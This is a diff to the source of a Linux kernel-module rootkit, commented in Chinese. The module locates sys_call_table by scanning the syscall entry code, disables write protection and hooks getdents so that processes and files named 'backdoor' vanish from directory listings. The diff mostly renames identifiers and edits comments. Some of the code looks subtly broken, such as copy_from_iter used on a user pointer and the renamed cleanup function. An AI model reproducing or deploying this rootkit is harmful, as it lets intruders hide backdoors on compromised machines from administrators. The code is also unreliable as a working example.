@@ -48,21 +48,22 @@ void  *get_lstar_sct_addr(void) //2
 	u64 lstar;//system_call地址
 	u64 index;
 
-      //MSR 是CPU 的一组64 位寄存器，可以分别通过RDMSR 和WRMSR 两条指令进行读和写的操作，
-      //MSR 总体来是为了设置CPU 的工作环境和标示CPU 的工作状态，包括温度控制，性能监控等，
-	rdmsrl(MSR_LSTAR, lstar);//&&&&&&&&
+    //MSR 是CPU 的一组64 位寄存器，可以分别通过RDMSR 和WRMSR 两条指令进行读和写的操作，
+    //MSR 总体来是为了设置CPU 的工作环境和标示CPU 的工作状态，包括温度控制，性能监控等，
+	rdmsrl(MSR_LSTAR, lstar);//获得syscall的地址
 	
-	/*从0×80号中断的中断服务程序system_call的地址开始搜索硬编码 \xff\x14\x85，这块硬编码的后面紧接着就是系统调用表的地址，
+	/*从0×80号中断的中断服务程序system_call的地址开始搜索硬编码 \xff\x14\xc5，这块硬编码的后面紧接着就是系统调用表的地址，
 	因为x86 call指令的二进制格式为\xff\x14\x85，而中断服务程序调用系统调用的语句是call sys_call_table(,eax,4)
 
 	X86 64位系统上，这一过程发生了变化。注意Linux x86_64使用的LP64字长模式。
 	Linux x86_64可以通过三种方式获取system_call表，Linux x86_64有两套调用模式：Long模式和兼容模式，对应有两套调用表：system_call，ia32_syscall.
-     兼容方式 使用int 0x80, MSR寄存器地址为0xc0000083,宏MSR_CSTAR来代表. 使用sidt获取system_call地址
-     Long方式 使用syscall, MSR寄存器地址为0xc0000082，用宏MSR_LSTAR来代表. 使用rdmsrl指令获取system_call地址
- */
+    兼容方式 使用int 0x80, MSR寄存器地址为0xc0000083,宏MSR_CSTAR来代表. 使用sidt获取system_call地址
+    Long方式 使用syscall, MSR寄存器地址为0xc0000082，用宏MSR_LSTAR来代表. 使用rdmsrl指令获取system_call地址
+ 	*/
+
+ 	//从sys_call中查找call指令，从而获得sct表的地址
 	for (index = 0; index <= PAGE_SIZE; index += 1) { //PAGE_SIZE一页内存大小
 		u8 *arr = (u8 *)lstar + index;   //u8 = unsigned char 占8位，1个字节
-		//通过sys_call获取sys_call_table特征码
 		if (arr[0] == 0xff && arr[1] == 0x14 && arr[2] == 0xc5) {
 		    return arr + 3;
 		}
@@ -82,7 +83,7 @@ unsigned long  **get_lstar_sct(void) //1
 		return NULL;
 	}                                         
 }
-
+//查看/proc/进程号/status中的进程名，如果不匹配，则返回1，否则返回0
 int check_pid_Name(char *pid_name,int len) //4
 {
 	int m_flag = 0;
@@ -124,7 +125,6 @@ int check_pid_Name(char *pid_name,int len) //4
 	//strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。
 	if (strstr(buf1,"backdoor") == NULL) //当前文件名未包含要隐藏的目标文件名，则置m_flag为1
 	{
-		//printk("find backdoor\n");
 		m_flag = 1;
 	}
 
@@ -137,7 +137,7 @@ int check_pid_Name(char *pid_name,int len) //4
 }
 
 
-int is_int(char *str)//进程号长度 //5
+int pid_len(char *str)//进程号长度 //5
 {
 	int str_len = 0;
 	char *ptr;
@@ -152,11 +152,11 @@ int is_int(char *str)//进程号长度 //5
 asmlinkage long my_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) //3
 {
 	struct linux_dirent *td,*td1,*td2,*td3;  
-	int number;
+	int values;
 	int copy_len = 0;
 
 	// 调用原始的系统调用，下面对返回结果进行过滤  
-	number = (*old_getdents) (fd, dirp, count);  
+	values = (*old_getdents) (fd, dirp, count);  
 	/*
 	The system call getdents() reads several linux_dirent structures from
        the directory referred to by the open file descriptor fd into the
@@ -165,12 +165,12 @@ asmlinkage long my_getdents(unsigned int fd, struct linux_dirent __user *dirp, u
        返回值： On success, the number of bytes read is returned.  On end of
        directory, 0 is returned.  On error, -1 is returned, and errno is set appropriately.
 	*/
-	if (!number)  
-		return (number);  
+	if (!values)  
+		return (values);  
 
 	// 分配内核空间，并把用户空间的数据拷贝到内核空间  
-	td2 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);//td2未过滤数据
-	td1 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);//td1已过滤数据
+	td2 = (struct linux_dirent *) kmalloc(values, GFP_KERNEL);//td2未过滤数据
+	td1 = (struct linux_dirent *) kmalloc(values, GFP_KERNEL);//td1过滤好的数据
 	td = td1;  //td指向td1头
 	td3 = td2; //td3指向td2头
 	/*
@@ -180,27 +180,28 @@ asmlinkage long my_getdents(unsigned int fd, struct linux_dirent __user *dirp, u
 	n:将要拷贝数据的字节数
 	返回：成功返回0，失败返回没有拷贝成功的数据字节数
 	*/
-	copy_from_iter(td2, dirp, number);  //从dirp拷贝到td2
+	copy_from_iter(td2, dirp, values);  //从dirp拷贝到td2
 	
-	while(number>0){
-		number = number - td2->d_reclen;//更新number
+	while(values>0){
+		values = values - td2->d_reclen;//更新values
+		//当前文件名未包含要隐藏的目标文件名，则拷贝到td1中
+		if(check_pid_Name(td2->d_name,pid_len(td2->d_name))){ 
 
-		if(check_pid_Name(td2->d_name,is_int(td2->d_name))){ //当前文件名未包含要隐藏的目标文件名，则拷贝到td1中
-			printk("%s,find backdoor, hide it.\n",td2->d_name);
+			printk("%s, not find\n",td2->d_name);
+			
 			memmove(td1, (char *) td2 , td2->d_reclen);
 			/*
 			void *memmove(void *s1,const void *s2,size_t n);
-                      说明：函数memmove从s2指向的对象中复制n个字符到s1指向的对象中。
-		      */
+        	说明：函数memmove从s2指向的对象中复制n个字符到s1指向的对象中。
+		    */
 			td1 = (struct linux_dirent *) ((char *)td1 + td2->d_reclen);//调整td1指针位置
 			copy_len = copy_len + td2->d_reclen;//更新过滤后数据长度
 		}
 		else
 		{
-			printk("%s, not find\n",td2->d_name);
+			printk("%s,find backdoor, don't copy it.\n",td2->d_name);
 		}
 		
-
 		td2 = (struct linux_dirent *) ((char *)td2 + td2->d_reclen);//调整td2指针位置
 	}
 	
@@ -246,13 +247,14 @@ int init_module()
 	else{
 		old_getdents = (void *)sys_call_table[__NR_getdents];
 		disable_write_protection();
+		//__NR_getdents相当于getdents的系统调用号
 		sys_call_table[__NR_getdents] = (unsigned long *)&my_getdents;
 		enable_write_protection();
 
 		return 0;
 	} 
 }
-void cleanup_module()
+void exit_module()
 {
 	disable_write_protection();
     sys_call_table[__NR_getdents] = (unsigned long *)old_getdents;
